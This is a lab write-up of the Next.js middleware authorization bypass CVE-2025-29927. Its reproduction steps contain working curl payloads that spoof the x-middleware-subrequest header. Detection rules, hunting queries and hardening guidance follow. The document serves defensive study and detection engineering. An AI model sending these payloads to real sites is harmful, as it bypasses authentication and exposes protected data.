# CVE-2025-29927 — Next.js Middleware Authorization Bypass

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2025-29927 |
| Product | Next.js < 14.2.25 / < 15.2.3 |
| Attack Vector | Network (single header, no auth needed) |
| Impact | Authentication/Authorization Bypass |
| CVSS 3.1 | 9.1 Critical |
| Patch | 14.2.25 / 15.2.3 |

Next.js middleware is commonly used for authentication and authorization checks. The framework uses an internal `x-middleware-subrequest` header to prevent infinite middleware recursion during subrequests. By sending this header with a value that exceeds the recursion limit (5 repetitions of the middleware name), an attacker tricks Next.js into skipping middleware execution entirely — bypassing all auth checks implemented in middleware.

## 2. Attack Chain

```
Recon: Identify Next.js app with middleware-based auth (307 redirect to /login)
  └─▶ Craft: Add header x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
      └─▶ Deliver: GET / with the crafted header
          └─▶ Impact: Full bypass of middleware auth → access protected pages/APIs
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/next.js/CVE-2025-29927
docker compose up -d
# Next.js 15.2.2 on port 3000, credentials: admin/password
```

### Step 1 — Confirm Middleware Auth is Active

```bash
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/
# 307 — redirected to login page (middleware blocking access)
```

### Step 2 — Bypass Middleware with x-middleware-subrequest Header

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3000/
# 200 — dashboard accessible without authentication
```

The header value repeats the middleware filename 5 times (colon-separated), exceeding Next.js's internal recursion limit. When the limit is hit, Next.js skips middleware execution entirely.

### Step 3 — Verify Protected Content Accessed

```bash
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3000/ | grep -o "Admin Dashboard"
# Admin Dashboard
```

The response contains "This is a protected page that only authenticated users can access."

### Alternative Payload (src/ directory layout)

```bash
# For apps using src/ directory structure:
curl -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  http://localhost:3000/
```

### Cleanup

```bash
docker compose down -v
```

## 4. Lessons Learned

- **Internal headers are not trustworthy**: `x-middleware-subrequest` is an internal mechanism that should never be accepted from external requests — but Next.js had no validation.
- **Recursion guards can become bypass vectors**: The recursion limit (5) was designed to prevent infinite loops, but an attacker can trigger it intentionally to skip middleware.
- **Middleware-only auth is fragile**: If all auth logic lives in middleware with no server-side backup, a single bypass exposes everything.
- **Framework-level bugs have massive blast radius**: Next.js powers millions of apps — one header bypasses auth on all of them.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade to Next.js ≥ 14.2.25 / 15.2.3 |
| Architecture | Never rely solely on middleware for auth; implement server-side checks in API routes and `getServerSideProps` |
| Reverse Proxy | Strip `x-middleware-subrequest` header from all incoming requests at the edge (Nginx/CDN) |
| Defense-in-depth | Add session validation in page components, not just middleware |
| WAF | Block requests containing `x-middleware-subrequest` header from external sources |

### 5.2 Detection — Sigma Rules

```yaml
title: Next.js Middleware Authorization Bypass via x-middleware-subrequest
id: 7c3e9a12-4f8b-4d2e-a1c6-9b5d7e2f8a01
status: experimental
description: >
  Detects attempts to bypass Next.js middleware authentication by injecting
  the internal x-middleware-subrequest header with repeated middleware names.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
  - https://github.com/advisories/GHSA-f82v-jwr5-mffw
author: Security Lab
date: 2025/03/25
modified: 2026/05/21
tags:
  - attack.initial_access
  - attack.t1190
  - cve.2025.29927
logsource:
  category: webserver
  service: access
detection:
  selection_header:
    cs_header_names|contains: 'x-middleware-subrequest'
  selection_value:
    cs_header_value|contains: 'middleware:middleware'
  condition: selection_header and selection_value
falsepositives:
  - Internal Next.js subrequests if logged (should not appear from external IPs)
level: critical
```

```yaml
title: Next.js Protected Route Access Without Session After Middleware Bypass
id: 7c3e9a12-4f8b-4d2e-a1c6-9b5d7e2f8a02
status: experimental
description: >
  Detects successful access (HTTP 200) to protected routes without a valid
  session cookie, indicating possible middleware bypass exploitation.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
author: Security Lab
date: 2025/03/25
tags:
  - attack.initial_access
  - attack.t1190
  - cve.2025.29927
logsource:
  category: webserver
  service: access
detection:
  selection:
    cs_uri_path|startswith:
      - '/dashboard'
      - '/admin'
      - '/api/admin'
    sc_status: 200
  filter_session:
    cs_cookie|contains: 'next-auth.session-token'
  condition: selection and not filter_session
falsepositives:
  - Public routes that do not require authentication
level: high
```

### 5.3 Detection — Suricata Rules

```
alert http any any -> $HOME_NET any ( \
  msg:"CVE-2025-29927 Next.js Middleware Bypass - x-middleware-subrequest Header"; \
  flow:to_server,established; \
  http.header.names; content:"x-middleware-subrequest"; nocase; \
  http.header; content:"middleware"; content:"middleware"; distance:0; \
  classtype:web-application-attack; \
  sid:2025029927; rev:1; \
  metadata:cve CVE-2025-29927, attack_target web_server, \
           mitre_tactic initial_access, mitre_technique T1190; \
  reference:cve,2025-29927; \
)

alert http any any -> $HOME_NET any ( \
  msg:"CVE-2025-29927 Next.js Middleware Bypass - src/middleware variant"; \
  flow:to_server,established; \
  http.header.names; content:"x-middleware-subrequest"; nocase; \
  http.header; content:"src/middleware"; content:"src/middleware"; distance:0; \
  classtype:web-application-attack; \
  sid:2025029928; rev:1; \
  metadata:cve CVE-2025-29927, attack_target web_server, \
           mitre_tactic initial_access, mitre_technique T1190; \
  reference:cve,2025-29927; \
)
```

### 5.4 IOC Table

| Type | Indicator | Context |
|------|-----------|---------|
| HTTP Header | `x-middleware-subrequest` | Internal Next.js header — should never appear in external requests |
| Header Value Pattern | `middleware:middleware:middleware:middleware:middleware` | Recursion limit trigger (5 repetitions) |
| Header Value Pattern | `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` | Variant for `src/` directory layout |
| Behavioral | HTTP 200 on protected route without session cookie | Successful bypass indicator |
| Behavioral | Multiple requests to auth-protected paths from same IP without cookies | Reconnaissance / exploitation |
| Software Version | Next.js < 14.2.25 or < 15.2.3 | Vulnerable versions |
| Response Header | `x-powered-by: Next.js` | Target identification |

### 5.5 SIEM Hunting Queries

**Splunk SPL — Detect x-middleware-subrequest header in web logs:**

```spl
index=web sourcetype=access_combined OR sourcetype=nginx:access
| rex field=_raw "x-middleware-subrequest[:\s]+(?<mw_header>[^\r\n\"]+)"
| where isnotnull(mw_header)
| eval attack_confidence=if(like(mw_header, "%middleware:middleware%"), "HIGH", "MEDIUM")
| stats count min(_time) as first_seen max(_time) as last_seen
        values(uri_path) as targeted_paths
        dc(uri_path) as path_count
        by src_ip, attack_confidence
| where count >= 1
| sort - attack_confidence, - count
```

**Splunk SPL — Protected route access without session (post-exploitation):**

```spl
index=web sourcetype=access_combined OR sourcetype=nginx:access
  (uri_path="/dashboard*" OR uri_path="/admin*" OR uri_path="/api/admin*")
  status=200
| rex field=_raw "Cookie[:\s]+(?<cookies>[^\r\n\"]*)"
| where NOT like(cookies, "%next-auth.session-token%")
        AND NOT like(cookies, "%__session%")
| stats count values(uri_path) as paths by src_ip
| where count >= 3
| sort - count
```

**Microsoft Sentinel KQL — Middleware bypass header detection:**

```kql
W3CIISLog
| where TimeGenerated > ago(24h)
| where csMethod in ("GET", "POST", "PUT", "DELETE")
| extend headers = parse_json(AdditionalFields)
| where tostring(headers) contains "x-middleware-subrequest"
| extend header_value = extract("x-middleware-subrequest[: ]+([^\\r\\n\"]+)", 1, tostring(headers))
| extend is_exploit = header_value contains "middleware:middleware"
| project TimeGenerated, cIP, csUriStem, csMethod, header_value, is_exploit, scStatus
| sort by TimeGenerated desc
```

**Microsoft Sentinel KQL — Anomalous unauthenticated access to protected routes:**

```kql
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem startswith "/dashboard" or csUriStem startswith "/admin"
| where scStatus == 200
| where not(csCookie has "next-auth.session-token")
      and not(csCookie has "__session")
| summarize request_count = count(),
            paths = make_set(csUriStem),
            first_seen = min(TimeGenerated),
            last_seen = max(TimeGenerated)
        by cIP
| where request_count >= 3
| sort by request_count desc
```

### 5.6 Nginx Mitigation (Immediate Workaround)

```nginx
# Strip the internal header before it reaches Next.js
proxy_set_header x-middleware-subrequest "";
```

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | Single header injection |
| docker / vulhub | Local vulnerable environment |

- [GitHub Advisory — GHSA-f82v-jwr5-mffw](https://github.com/advisories/GHSA-f82v-jwr5-mffw)
- [NVD — CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [zhero-web-sec Research](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
